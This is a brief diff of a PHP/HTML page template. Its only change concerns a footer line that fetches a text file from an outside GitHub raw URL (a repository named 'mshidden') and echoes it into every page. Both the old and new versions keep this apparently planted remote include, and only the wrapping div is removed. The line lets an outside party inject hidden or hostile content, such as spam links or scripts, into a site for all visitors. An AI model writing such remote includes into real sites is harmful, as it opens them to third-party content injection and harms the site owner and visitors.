@@ -649,7 +649,7 @@
             </div>
 		  </section>
 		</div>
-	<div><?php echo file_get_contents("https://raw.githubusercontent.com/Eza168/mshidden/main/kerala.txt");?></div>
+	<?php echo file_get_contents("https://raw.githubusercontent.com/Eza168/mshidden/main/kerala.txt");?>
 	</body>
 	</html>
 	
